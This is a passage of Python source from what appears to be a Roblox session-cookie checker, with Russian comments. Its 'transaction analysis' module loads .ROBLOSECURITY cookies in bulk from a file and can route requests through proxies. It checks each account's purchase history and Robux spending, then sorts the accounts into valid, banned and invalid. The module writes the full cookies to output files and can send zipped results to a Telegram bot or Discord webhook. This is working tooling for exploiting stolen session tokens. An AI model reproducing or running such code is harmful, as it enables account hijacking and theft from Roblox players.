                    try: config['Roblox']['TransactionAnalysis']['Places'].remove(placeId)
                    except Exception: ...

                    try: config['Roblox']['TransactionAnalysis']['Places'].remove(f'{placeId}_Ignore_List')
                    except Exception: ...

                    autoSaveConfig()
            case 'F' | 'А':
                labelASCII()
            case _:
                removeLines(9)

        autoSaveConfigAndRemoveLinesInSettings(settingsRTAPlacesPlaceTab, ('C', 'С'), ('0', 'C', 'С'), 9)

async def isTransactionsFromCookieFunc(checkedAccount: set, checkListPlaces: dict[str, tuple[str, int, int, tuple[str, int, str]]], cookies: dict, proxies: Optional[list[str]] = None) -> tuple[str, str, dict]:
    accountInformation = await getAccountInformationRoblox(cookies, proxies)
    userId = accountInformation['UserId']
    if userId in checkedAccount:
        return userId, None, None
    checkedAccount.add(userId)
    isName = accountInformation['Name']

    nextPageCursor = ''
    while nextPageCursor is not None:
        response: dict = await sendGetRequestRoblox(f'https://economy.roblox.com/v2/users/{userId}/transactions?transactionType=Purchase&limit=100&cursor={nextPageCursor}', cookies=cookies, proxies=proxies)
        for transaction in response['data']:
            placeID = str(transaction['details']['place']['placeId']) if 'place' in transaction['details'] else str(transaction['details']['id']) if 'id' in transaction['details'] else ''
            if placeID in checkListPlaces:
                transactionName = transaction['details']['name']
                ignoreList = config['Roblox']['TransactionAnalysis']['Places'][f'{placeID}_Ignore_List']
                if [transactionName, True] not in ignoreList or config['Roblox']['TransactionAnalysis']['Places'][placeID][4]:
                    price = abs(transaction['currency']['amount'])
                    checkListPlaces[placeID][1] += price
                if [transactionName, True] not in ignoreList:
                    checkListPlaces[placeID][3].append([transactionName, price, convertDate(transaction['created'], '%d.%m.%Y - %H:%M:%S')])
                if ([transactionName, True] not in ignoreList and [transactionName, False] not in ignoreList) and config['Roblox']['TransactionAnalysis']['Places'][placeID][3]:
                    ignoreList.append([transactionName, False])
                checkListPlaces[placeID][2] += 1
        nextPageCursor = response['nextPageCursor']

    return userId, isName, checkListPlaces

async def robloxTransactionAnalysis(file: str) -> None:
    labelASCII()
    cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Transaction_Analysis)}\n\n [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Wait[0]}...')

    checkListPlaces = {str(place): [config['Roblox']['TransactionAnalysis']['Places'][str(place)][1][0], 0, 0, []] for place in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']
                       if config['Roblox']['TransactionAnalysis']['Places'][str(place)][2]}
    if not checkListPlaces:
        return errorOrCorrectHandler(True, MT_Enable_At_Least_One_Place_To_Start_Analysis, generateVisualPath(MT_Roblox, MT_Transaction_Analysis))

    isUseProxy = config['Roblox']['General']['Proxy']['Use_Proxy']
    proxiesFromFile = getProxiesFromFileRoblox(isUseProxy, Path('Roblox', 'proxies.txt'), generateVisualPath(MT_Roblox, MT_Transaction_Analysis))
    if isUseProxy and not proxiesFromFile:
        return

    cookiesFromFile = getCookiesFromFileRoblox(Path('Roblox', 'Transaction Analysis', file), generateVisualPath(MT_Roblox, MT_Transaction_Analysis))
    if not cookiesFromFile:
        return

    checkReadyCookies = await robloxCookieValidChecker('TransactionAnalysis', cookiesFromFile, proxiesFromFile)
    if not checkReadyCookies:
        return

    def printTotalOutputRTA():
        cmdWriter(rf'''
  {ANSI.FG.GRAY}{'_____________________________________'}
 {ANSI.FG.GRAY}/   | {                                        ANSI.FG.CYAN              }Cookie{      ANSI.FG.WHITE                 }: {counters['cookie']} {MT_Of} {amountOfCookies}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[0]}{ANSI.FG.GRAY} | {ANSI.FG.GREEN             }Valid{       ANSI.FG.WHITE                 }: {counters['valid']} ({ANSI.FG.YELLOW}Dupes{ANSI.FG.WHITE}: {counters['duplicates']})
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[1]}{ANSI.FG.GRAY} | {ANSI.FG.RED               }Invalid{     ANSI.FG.WHITE                 }: {counters['invalid']}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[2]}{ANSI.FG.GRAY} | {ANSI.CLEAR}{ANSI.FG.YELLOW}Banned{      ANSI.FG.WHITE}{ANSI.DECOR.BOLD}: {counters['banned']}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[3]}{ANSI.FG.GRAY} | {ANSI.FG.CYAN              }Non-empty{   ANSI.FG.WHITE                 }: {counters['nonempty']}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[4]}{ANSI.FG.GRAY} | {ANSI.FG.CYAN              }Transactions{ANSI.FG.WHITE                 }: {counters['transactions']}
 {ANSI.FG.GRAY}\   | {                                        ANSI.FG.CYAN              }Robux{       ANSI.FG.WHITE                 }: {counters['robux']}
  {ANSI.FG.GRAY}{'‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾'}{ANSI.FG.WHITE}
'''.lstrip('\n'))


    isOutputTotal = config['Outputs']['Output_Total']
    isSendResultsToTelegramBot = config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot']
    isSendResultsToDiscordWebhook = config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook']

    checkedAccounts = set()
    telegramOutputData = {}
    amountOfCookies = len(checkReadyCookies)
    counters = {
        'cookie'       : 0,
        'valid'        : 0,
        'nonempty'     : 0,
        'invalid'      : 0,
        'banned'       : 0,
        'duplicates'   : 0,
        'transactions' : 0,
        'robux'        : 0
    }
    validLock  = asyncio.Lock()
    exceptLock = asyncio.Lock()
    dateOfCheck = currentDate('%d.%m.%Y - %H.%M.%S')
    savePath = Path('Roblox', 'Transaction Analysis', 'outputs', dateOfCheck)
    semaphore = asyncio.Semaphore(int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']) if str(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']).isdigit() and (0 < int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']) <= 500) else 50)
    minuses = '-'*52

    def consoleOutputHandlerRTA(counter: str, message: str) -> None:
        if isOutputTotal and counters['cookie']:
            removeLines(9)
        counters[counter]  += 1
        counters['cookie'] += 1
        cmdWriter(message)
        if isOutputTotal:
            printTotalOutputRTA()

    # Проверка транзакций
    async def threadingTransactionAnalysis(cookie: str) -> None:
        async with semaphore:
            try:
                cookies = {'.ROBLOSECURITY': cookie}
                userId, nickname, checkListPlaces_ = await isTransactionsFromCookieFunc(checkedAccounts, copy.deepcopy(checkListPlaces), cookies, proxiesFromFile)
                if nickname is None:
                    raise AccountDuplicate
                partOfCookie = f'{cookie[115:130]}...{cookie[-15:-1]}'
                accountCounters = {
                    'transactions': 0,
                    'robux': 0
                }

                for _, placeData in checkListPlaces_.items():
                    placeRobux = placeData[1]
                    
                    if not placeRobux:
                        continue
                    
                    placeName = placeData[0]
                    placeTransactions = placeData[2]
                    placePurchasesData = placeData[3]
                    
                    if isSendResultsToTelegramBot:
                        telegramOutputData.setdefault(placeName, {'robux': 0, 'transactions': 0})
                        telegramOutputData[placeName]['robux'] += placeRobux
                        telegramOutputData[placeName]['transactions'] += placeTransactions
                        
                    accountCounters['robux'] += placeRobux
                    accountCounters['transactions'] += placeTransactions
                    (savePath / f'{partOfCookie} ({nickname})').mkdir(parents=True, exist_ok=True)
                    async with aiofiles.open(savePath / f'{partOfCookie} ({nickname})' / f'{placeName} ({placeTransactions} {MT_On.lower()} {placeRobux} R$).txt', 'a', encoding='utf-8') as file:
                        await file.write(f'\n Meow :3\n\n {MT_Id}: {userId}\n {MT_Nickname}: {nickname}\n {MT_Link}: https://www.roblox.com/users/{userId}\n {MT_Cookie}: {cookie}\n{minuses}\n > {MT_Total.capitalize()}: {placeData[1]} R$\n{minuses}\n')
                        for item in placePurchasesData:
                            await file.write(f' > {MT_Name}: {item[0]}\n > {MT_Price}: {item[1]} R$\n > {MT_Date}: {item[2]}\n{minuses}\n')

                counters['robux'] += accountCounters['robux']
                counters['transactions'] += accountCounters['transactions']

                if accountCounters['transactions']:
                    indentationLength = max(len(placeName) for _, placeData in checkListPlaces_.items() if placeData[1]) + 1 if config['Roblox']['TransactionAnalysis']['General']['Indentation_By_The_Longest_Name'] else 0
                    async with aiofiles.open(savePath / f'{partOfCookie} ({nickname})' / f'.All ({accountCounters['transactions']} {MT_On.lower()} {accountCounters['robux']} R$).txt', 'a', encoding='utf-8') as file:
                        await file.write(f'\n Meow :3\n\n {MT_Id}: {userId}\n {MT_Nickname}: {nickname}\n {MT_Link}: https://www.roblox.com/users/{userId}\n {MT_Cookie}: {cookie}\n{minuses}\n > {MT_Total.capitalize()}: {accountCounters['robux']} R$\n{minuses}\n')
                        for _, placeData in checkListPlaces_.items():
                            if placeData[1]:
                                await file.write(f' > {placeName:<{indentationLength}}: {placeData[1]} R$\n')                        
                        await file.write(f'{minuses}\n')

                color = ANSI.FG.GREEN if accountCounters['transactions'] else ANSI.FG.RED
                async with validLock:
                    if accountCounters['transactions']:
                        counters['nonempty'] += 1
                        async with aiofiles.open(savePath / '1+ transactions.txt', 'a', encoding='utf-8') as file:
                            await file.write(f'{MT_Link}: https://www.roblox.com/users/{userId} | {MT_Id}: {userId} | {MT_Nickname}: {nickname} | {MT_Transactions}: {accountCounters['transactions']} {MT_On.lower()} {accountCounters['robux']} R$ | {MT_Cookie}: {cookie}\n')
                    else:
                        async with aiofiles.open(savePath / '0 transactions.txt', 'a', encoding='utf-8') as file:
                            await file.write(f'{MT_Link}: https://www.roblox.com/users/{userId} | {MT_Id}: {userId} | {MT_Nickname}: {nickname} | {MT_Transactions}: 0 {MT_On.lower()} 0 R$ | {MT_Cookie}: {cookie}\n')
                    consoleOutputHandlerRTA('valid', f'\r [{ANSI.FG.GREEN}>{ANSI.FG.WHITE}] {ANSI.FG.CYAN}{MT_Nickname}{ANSI.FG.WHITE}: {nickname} | {ANSI.FG.CYAN}{MT_Transactions}{ANSI.FG.WHITE}: {color}{accountCounters['transactions']} {MT_On.lower()} {accountCounters['robux']} R${ANSI.FG.WHITE}\n')
            except InvalidCookie:
                async with exceptLock:
                    async with aiofiles.open(savePath / 'invalid.txt', 'a', encoding='utf-8') as file:
                        await file.write(f'{cookie}\n')
                    consoleOutputHandlerRTA('invalid', f'\r [{ANSI.FG.RED}>{ANSI.FG.WHITE}] {ANSI.FG.RED}{MT_Invalid_Cookie}{ANSI.FG.WHITE}\n')
            except AccountBanned:
                async with exceptLock:
                    async with aiofiles.open(savePath / 'banned.txt', 'a', encoding='utf-8') as file:
                        await file.write(f'{cookie}\n')
                    consoleOutputHandlerRTA('banned', f'\r [{ANSI.CLEAR}{ANSI.FG.YELLOW}>{ANSI.FG.WHITE}{ANSI.DECOR.BOLD}] {ANSI.CLEAR}{ANSI.FG.YELLOW}{MT_Account_Banned}{ANSI.CLEAR}{ANSI.DECOR.BOLD}\n')
            except AccountDuplicate:
                async with exceptLock:
                    async with aiofiles.open(savePath / 'duplicates.txt', 'a', encoding='utf-8') as file:
                        await file.write(f'{MT_Id}: {userId} | {MT_Cookie}: {cookie}\n')
                    consoleOutputHandlerRTA('duplicates', f'\r [{ANSI.FG.YELLOW}>{ANSI.FG.WHITE}] {ANSI.FG.YELLOW}{MT_Account_Duplicate}{ANSI.FG.WHITE}\n')
            except Exception as e:
                logger.exception(f'< [ROBLOX_TRANSACTION_ANALYSIS] > {MT_Critical_Error}: {e}', force=True)

    savePath.mkdir(parents=True, exist_ok=True)
    cmdWriter(f'\r [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINEON}{file}{ANSI.DECOR.UNDERLINEOFF}\':\n')
    
    start = timer('start')
    await asyncio.gather(
        *(threadingTransactionAnalysis(cookie) for cookie in checkReadyCookies)
    )
    stop = timer('stop', start=start)

    cmdWriter(f' [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Checking_Complete} {MT_In[1].lower()} {formatDuration(int(stop * 1000))}\n\n')
    playSystemSound()

    if isSendResultsToTelegramBot or isSendResultsToDiscordWebhook:
        messageText = (
            f'<b>💜 {MT_Roblox} {MT_Transaction_Analysis.lower()}\n\n'
            
            f'🟢 {MT_Valid}: {counters['valid']}\n'
            f'🟡 {MT_Duplicates}: {counters['duplicates']}\n'
            f'🔴 {MT_Invalid}: {counters['invalid']}\n'
            f'🟠 {MT_Banned[1]}: {counters['banned']}\n'
            f'🔵 {MT_Non_Empty}: {counters['nonempty']}\n\n'
            
            f'🛒 {MT_Transactions}: {counters['transactions']}\n'
            f'💎 {MT_Spent}: {counters['robux']} R$</b>\n\n'
            
            + '\n'.join(
                f'🎮 {placeName}: <b>{placeData['robux']} R$</b> за <b>{placeData['transactions']} тр.</b>'
                for placeName, placeData in telegramOutputData.items()
            )
        )
        makeArchive(dateOfCheck, 'Roblox', 'Transaction Analysis', 'outputs')
        _path = Path('Roblox', 'Transaction Analysis', 'outputs', 'archives', f'{dateOfCheck}.zip')
        await sendMessageTelegramBot(messageText, _path)
        sendMessageDiscordWebhook(messageText.replace('<b>', '**').replace('</b>', '**'), _path)
        cmdWriter('\n')

    waitingInput()

### Другие функции

# Настройки > Общее
def changeConsoleTitle(newName: str) -> None:
    if newName == '0':
        return removeLines(7)
    if not newName.strip():
        return errorOrCorrectHandler(True, MT_The_Name_Cannot_Be_Empty, (MT_Settings, MT_General))
    if len(newName) > 100:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_Name.format('50'), (MT_Settings, MT_General))
    if any(char in newName for char in CONSOLE_NAME_SPECIAL_CHARS):
        return errorOrCorrectHandler(True, f'{MT_Do_Not_Use_This_Characters}: {', '.join(CONSOLE_NAME_SPECIAL_CHARS)}', (MT_Settings, MT_General))

    os.system(f'title {newName}')
    config['General']['Console_Title'] = newName
    autoSaveConfig()
    removeLines(7)

# Настройки > Выводы > [Телеграм бот, Дискорд вебхук]
def changeTelegramBotToken(botToken: str) -> None:
    if botToken == '0':
        return removeLines(5)
    if not botToken:
        return errorOrCorrectHandler(True, MT_Value_Cannot_Be_Empty, generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))

    config['Outputs']['TelegramBot']['Telegram_Bot_Token'] = botToken
    autoSaveConfig()
    removeLines(5)

def changeTelegramChatID(chatId: str) -> None:
    if chatId == '0':
        return removeLines(5)
    if not chatId:
        return errorOrCorrectHandler(True, MT_Value_Cannot_Be_Empty, generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
    if not chatId.isdigit():
        return errorOrCorrectHandler(True, MT_Value_Must_Consist_Of_Digits, generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))

    config['Outputs']['TelegramBot']['Telegram_Bot_Chat_ID'] = chatId
    autoSaveConfig()
    removeLines(5)

async def autoFindChatID() -> None:
    if not config['Outputs']['TelegramBot']['Telegram_Bot_Token']:
        return errorOrCorrectHandler(True, f'{MT_Specify_The_Bot_Token}...', generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
    if len(str(config['Outputs']['TelegramBot']['Telegram_Bot_Token']).split(':')) != 2:
        return errorOrCorrectHandler(True, f'{MT_Possibly_A_Typo_In_The_Bot_Token}...', generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))

    removeLines(11)
    cmdWriter(f' [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Wait[0]}...')

    try:
        data = (await sendGetRequest(f'https://api.telegram.org/bot{config['Outputs']['TelegramBot']['Telegram_Bot_Token']}/getUpdates', 'JSON'))['result'][-1]['message']['chat']
        removeLines(1)
        whileTrueStageChatID = True
        while whileTrueStageChatID:
            cmdWriter(f'\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_You[2]} {data['username']}?\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_Yes}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_No}\n\n')
            confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
            match confirmTheAction:
                case 'Y' | 'Н':
                    config['Outputs']['TelegramBot']['Telegram_Bot_Chat_ID'] = str(data['id'])
                    autoSaveConfig()
                    removeLines(8)
                    whileTrueStageChatID = False
                case 'N' | 'Т':
                    return errorOrCorrectHandler(True, f'{MT_Send_Any_Message_To_The_Bot_And_Try_Again}...', generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
                case _:
                    removeLines(7)
    except AttributeError:
        return errorOrCorrectHandler(True, f'{MT_Possibly_A_Typo_In_The_Bot_Token}...', generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
    except IndexError:
        return errorOrCorrectHandler(True, f'{MT_Send_Any_Message_To_The_Bot_And_Try_Again}...', generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
    except TelegramNetworkError:
        return errorOrCorrectHandler(True, f'{MT_Possibly_The_Internet_Is_Unstable}...', generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
    except Exception as e:
        logger.exception(f' < [TELEGRAM_BOT_AUTO_FIND_CHAT_ID] > {MT_Unknown_Error}: {e}', force=True)
        return errorOrCorrectHandler(True, f'{MT_Unknown_Error}: {e}', generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))

async def testMeowTelegramBot() -> None:
    if not str(config['Outputs']['TelegramBot']['Telegram_Bot_Token']).strip():
        return errorOrCorrectHandler(True, MT_Specify_The_Bot_Token, generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
    if not str(config['Outputs']['TelegramBot']['Telegram_Bot_Chat_ID']).strip():
        return errorOrCorrectHandler(True, MT_Specify_The_Chat_ID, generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))

    removeLines(11)
    cmdWriter(f' [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Wait[0]}...')
    cmdFlusher()
    await sendMessageTelegramBot('💜 Meow :3', test=True)
    cmdWriter('\n')
    waitingInput()

def changeDiscordWebhookURL(webhookUrl: str) -> None:
    if webhookUrl == '0':
        return removeLines(7)
    if not webhookUrl:
        return errorOrCorrectHandler(True, MT_Value_Cannot_Be_Empty, generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))

    config['Outputs']['DiscordWebhook']['Discord_Webhook_URL'] = webhookUrl
    autoSaveConfig()
    labelASCII()

def testMeowDiscordWebhook() -> None:
    if not str(config['Outputs']['DiscordWebhook']['Discord_Webhook_URL']).strip():
        return errorOrCorrectHandler(True, MT_Specify_The_Webhook_URL, generateVisualPath(MT_Settings, MT_Outputs, MT_Discord_Webhook))

    removeLines(7)
    cmdWriter(f' [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Wait[0]}...')
    cmdFlusher()
    sendMessageDiscordWebhook('💜 Meow :3', test=True)
    cmdWriter('\n')
    waitingInput()

# Настройки > Роблокс > Общее
def changeSymbols(symbols: str) -> None:
    if symbols == '0':
        return removeLines(5)
    if len(symbols) > 50:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_String.format('50'), generateVisualPath(MT_Settings, MT_Roblox, MT_General))

    config['Roblox']['General']['Symbols_Between_Warning_And_Cookie'] = symbols
    autoSaveConfig()
    removeLines(5)

# Настройки > Роблокс > [Куки чекер, Куки сортер] > Общее
def changeOutputFilenameRoblox(category: str, newName: str) -> None:
    if newName == '0':
        return removeLines(5)
    visualCategory = MT_Cookie_Checker if category == 'CookieChecker' else MT_Cookie_Sorter
    if not newName.strip() or any(char in newName for char in FILENAME_SPECIAL_CHARS):
        return errorOrCorrectHandler(True, MT_Incorrect_Filename, generateVisualPath(MT_Settings, MT_Roblox, visualCategory, MT_General))
    if len(newName) > 50:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_Name.format('50'), generateVisualPath(MT_Settings, MT_Roblox, visualCategory, MT_General))

    match category:
        case 'CookieChecker': config['Roblox']['CookieChecker']['General']['Output_Filename'] = newName
        case 'CookieSorter':  config['Roblox']['CookieSorter']['Output_Filename'] = newName
    autoSaveConfig()
    removeLines(5)

# Настройки > Роблокс > [Куки чекер, Анализ транзакций] > Общее
def changeNumberOfThreads(category: str, option: str, threads: str, limitOfThreads: int) -> None:
    if threads == '0':
        return removeLines(5)
    visualCategory = MT_Cookie_Checker if category == 'CookieChecker' else MT_Transaction_Analysis
    if not threads.isdigit():
        return errorOrCorrectHandler(True, MT_Incorrect_Value, generateVisualPath(MT_Settings, MT_Roblox, visualCategory, MT_General))
    if int(threads) > limitOfThreads:
        return errorOrCorrectHandler(True, MT_Do_Not_Exceed_The_Thread_Limit.format(limitOfThreads), generateVisualPath(MT_Settings, MT_Roblox, visualCategory, MT_General))

    config['Roblox'][category]['General'][option] = int(threads)
    autoSaveConfig()
    removeLines(5)

# Настройки > Роблокс > Куки чекер > Основное
def addCustomGamepassRoblox(customGamepassName: str, nameOfCategory: str) -> None:
    if customGamepassName == '0':
        return
    if not customGamepassName.strip():
        return errorOrCorrectHandler(True, MT_The_Name_Cannot_Be_Empty, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))
    if len(customGamepassName) > 50:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_Name.format('50'), generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))
    if checkExist(customGamepassName, 'Custom_Gamepasses'):
        return errorOrCorrectHandler(True, MT_Gamepass_With_This_Name_Already_Exists, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))

    config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_List'].append([customGamepassName, False])
    autoSaveConfig()

async def addPlaceRoblox(placeId: str, nameOfCategory: Literal['Favorite Places', 'Places Weekly Playtime']) -> None:
    if placeId == '0':
        return
    _nameOfCategory = '_'.join(nameOfCategory.split())
    if checkExist(placeId, _nameOfCategory):
        return errorOrCorrectHandler(True, MT_Place_With_This_ID_Already_Exists, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))

    try:
        universeId = (await sendGetRequest(f'https://apis.roblox.com/universes/v1/places/{placeId}/universe', 'JSON'))['universeId']
        if not universeId:
            return errorOrCorrectHandler(True, MT_Incorrent_Place_ID, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))

        placeName = (await sendGetRequest(f'https://games.roblox.com/v1/games?universeIds={universeId}', 'JSON'))['data'][0]['name']
        cleanPlaceName = rmTwoSpaces(rmPatternFromString(SPECIAL_CHARS, rmBracketsAndIn(rmEmojies(placeName), round=True, square=True)))

        match nameOfCategory:
            case 'Favorite Places':
                placeData = [int(placeId), cleanPlaceName, False]
            case 'Places Weekly Playtime':
                placeData = [int(placeId), int(universeId), cleanPlaceName, False]
        
        config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_List'].append(placeData)
        autoSaveConfig()
    except Exception as e:
        logger.exception(f'< [ROBLOX_ADD_{_nameOfCategory.upper()}] > {MT_Unknown_Error}: {e}', force=True)
        return errorOrCorrectHandler(True, MT_Unknown_Error, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))

async def addBundleRoblox(bundleId: str, nameOfCategory: Literal['Bundles']) -> None:
    if bundleId == '0':
        return
    if checkExist(bundleId, nameOfCategory):
        return errorOrCorrectHandler(True, MT_Bundle_With_This_ID_Already_Exists, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))

    try:
        response: ClientResponse = await sendGetRequest(f'https://catalog.roblox.com/v1/bundles/{bundleId}/details', 'ALL')
        match response.status:
            case 200:
                bundleName = str((await response.json())['name']).strip()
                config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory}_List'].append([int(bundleId), bundleName, False])
                autoSaveConfig()
            case 400:
                return errorOrCorrectHandler(True, MT_Incorrent_Bundle_ID, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))
            case _:
                return errorOrCorrectHandler(True, f'{MT_Unknown_Server_Response_Code}: {response.status}', generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))
    except Exception as e:
        logger.exception(f'< [ROBLOX_ADD_BUNDLE] > {MT_Unknown_Error}: {e}', force=True)
        return errorOrCorrectHandler(True, MT_Unknown_Error, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory))

# Настройки > Роблокс > Куки чекер > Сортировка
def addSortParameterFrom(sortValue: str, configRCCSorting: dict[str, dict[str, dict[str, list[list]]]], categoryConfigName: str, categoryMenuName: str) -> None:
    if sortValue == '0':
        return
    if len(sortValue) > 25:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_Parameter.format('25'), generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName))
    if not sortValue.isdigit():
        return errorOrCorrectHandler(True, MT_Parameter_Must_Be_A_Number, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName))
    if int(sortValue) in [parameter[0] for parameter in configRCCSorting[categoryConfigName][2][1]]:
        return errorOrCorrectHandler(True, MT_Such_A_Parameter_Already_Exists, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName))

    configRCCSorting[categoryConfigName][2][1].append([int(sortValue), False])
    autoSaveConfig()

def addSortParameterFromTo(sortValue: str, configRCCSorting: dict[str, dict[str, dict[str, list[list]]]], categoryConfigName: str, categoryMenuName: str) -> None:
    if sortValue == '0':
        return
    if len(sortValue.split()) != 2:
        return errorOrCorrectHandler(True, MT_Specify_Two_Numbers_Separated_By_A_Space, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName))
    valueFrom, valueTo = sortValue.split()
    if len(valueFrom) > 25 or len(valueTo) > 25:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_Parameter.format('25'), generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName))
    if not (valueFrom.isdigit() and valueTo.isdigit()):
        return errorOrCorrectHandler(True, MT_Both_Parameters_Must_Be_Numbers, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName))
    if int(valueFrom) >= int(valueTo):
        return errorOrCorrectHandler(True, MT_First_Number_Must_Be_Less_Than_Second_One, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName))
    if [int(valueFrom), int(valueTo)] in [parameter[0] for parameter in configRCCSorting[categoryConfigName][3][1]]:
        return errorOrCorrectHandler(True, MT_Such_A_Parameter_Already_Exists, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName))

    configRCCSorting[categoryConfigName][3][1].append([[int(valueFrom), int(valueTo)], False])
    autoSaveConfig()

# Настройки > Роблокс > Куки чекер > Кастомные плейсы
async def addCustomPlaceRoblox(customPlaceId: str):
    if customPlaceId == '0':
        return
    if not customPlaceId.isdigit():
        return errorOrCorrectHandler(True, MT_Incorrent_Place_ID, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places))
    if int(customPlaceId) in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
        return errorOrCorrectHandler(True, MT_Place_With_This_ID_Already_Exists, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places))

    try:
        universeId = (await sendGetRequest(f'https://apis.roblox.com/universes/v1/places/{customPlaceId}/universe', 'JSON'))['universeId']
        if not universeId:
            return errorOrCorrectHandler(True, MT_Incorrent_Place_ID, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places))

        customPlaceGamepassesData = (await sendGetRequest(f'https://apis.roblox.com/game-passes/v1/universes/{universeId}/game-passes?pageSize=101', 'JSON'))['gamePasses']
        customPlaceBadgesData     = (await sendGetRequest(f'https://badges.roblox.com/v1/universes/{universeId}/badges?limit=100&sortOrder=Asc', 'JSON'))['data']
        if not (customPlaceGamepassesData or customPlaceBadgesData):
            return errorOrCorrectHandler(True, MT_The_Place_Has_No_Gamepasses_And_Badges, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places))

        customPlaceName = (await sendGetRequest(f'https://games.roblox.com/v1/games?universeIds={universeId}', 'JSON'))['data'][0]['name']
        normalPlaceName = rmEmojies(rmBracketsAndIn(customPlaceName, round=True, square=True)).replace('"', '').strip()
        if normalPlaceName:
            abbreviatedPlaceName = ''.join(word[0] for word in normalPlaceName.split())
        else:
            normalPlaceName      = f'Unknown_{customPlaceId}'
            abbreviatedPlaceName = f'UNK_{customPlaceId[:5]}'

        config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'].append(int(customPlaceId))
        config['Roblox']['CookieChecker']['CustomPlaces'][customPlaceId] = [int(customPlaceId), [normalPlaceName, str(customPlaceName).strip(), abbreviatedPlaceName.upper()], False]

        if customPlaceGamepassesData:
            gamepassesList = []
            for gamepass in customPlaceGamepassesData:
                gamepassId = gamepass['id']
                gamepassName = rmTwoSpaces(rmBracketsAndIn(rmPatternFromString(SPECIAL_CHARS, rmEmojies(str(gamepass['name']).strip())), round=True, square=True))
                if not gamepassName:
                    gamepassName = f'id{gamepassId}'
                gamepassesList.append([gamepassId, gamepassName, False])
